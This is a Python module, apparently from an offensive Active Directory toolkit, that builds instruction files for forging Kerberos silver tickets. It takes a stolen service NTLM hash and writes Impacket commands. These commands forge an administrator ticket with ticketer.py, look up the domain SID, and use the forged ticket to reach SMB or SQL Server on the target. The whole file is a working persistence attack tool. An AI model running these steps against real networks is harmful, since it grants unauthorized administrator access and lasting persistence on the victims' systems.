#!/usr/bin/env python3
"""
Silver Ticket Generation Module
Creates service-specific Kerberos tickets for persistence
"""
import sys
import os
import argparse

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential
from core.logger import setup_logger, get_logger

logger = None

def create_silver_ticket(session_dir, domain, service_account, service_hash, target_host, service_type="cifs"):
    """Generate silver ticket instructions"""
    global logger
    setup_logger("silver_ticket", session_dir)
    logger = get_logger("silver_ticket")
    
    logger.info(f"Generating Silver Ticket for {service_type}/{target_host}")
    
    # Common service types
    service_map = {
        "cifs": "File share access (SMB)",
        "http": "Web services",
        "mssql": "SQL Server",
        "ldap": "LDAP/AD queries",
        "host": "General host access"
    }
    
    description = service_map.get(service_type, "Unknown service")
    
    instructions_file = os.path.join(session_dir, f"silver_ticket_{service_type}_{target_host}.txt")
    
    with open(instructions_file, 'w') as f:
        f.write(f"# Silver Ticket Generation - {service_type.upper()}\n\n")
        f.write(f"## Target Information\n")
        f.write(f"Domain: {domain}\n")
        f.write(f"Service Account: {service_account}\n")
        f.write(f"Service Hash (NTLM): {service_hash}\n")
        f.write(f"Target Host: {target_host}\n")
        f.write(f"Service Type: {service_type} ({description})\n\n")
        
        f.write(f"## Generation Command\n")
        f.write(f"```bash\n")
        f.write(f"ticketer.py -nthash {service_hash} \\\n")
        f.write(f"  -domain-sid <DOMAIN_SID> \\\n")
        f.write(f"  -domain {domain} \\\n")
        f.write(f"  -spn {service_type}/{target_host} \\\n")
        f.write(f"  administrator\n")
        f.write(f"```\n\n")
        
        f.write(f"## Get Domain SID\n")
        f.write(f"```bash\n")
        f.write(f"lookupsid.py {domain}/user:password@{target_host}\n")
        f.write(f"```\n\n")
        
        f.write(f"## Usage\n")
        f.write(f"```bash\n")
        f.write(f"export KRB5CCNAME=administrator.ccache\n")
        if service_type == "cifs":
            f.write(f"smbclient.py -k -no-pass {domain}/administrator@{target_host}\n")
        elif service_type == "mssql":
            f.write(f"mssqlclient.py -k -no-pass {domain}/administrator@{target_host}\n")
        else:
            f.write(f"# Use appropriate Impacket tool with -k -no-pass flags\n")
        f.write(f"```\n")
    
    logger.info(f"Silver ticket instructions saved: {instructions_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--service-account", required=True)
    parser.add_argument("--service-hash", required=True)
    parser.add_argument("--target-host", required=True)
    parser.add_argument("--service-type", default="cifs", choices=["cifs", "http", "mssql", "ldap", "host"])
    args = parser.parse_args()
    
    create_silver_ticket(args.session_dir, args.domain, args.service_account,
                        args.service_hash, args.target_host, args.service_type)
